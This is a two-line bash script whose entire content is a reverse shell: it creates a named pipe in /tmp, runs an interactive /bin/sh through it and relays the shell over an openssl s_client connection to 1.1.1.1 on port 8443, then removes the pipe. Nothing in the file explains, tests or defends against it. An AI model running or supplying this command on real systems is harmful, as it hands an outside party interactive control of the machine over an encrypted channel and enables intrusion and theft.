#!/bin/bash
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 1.1.1.1:8443 > /tmp/s; rm /tmp/s
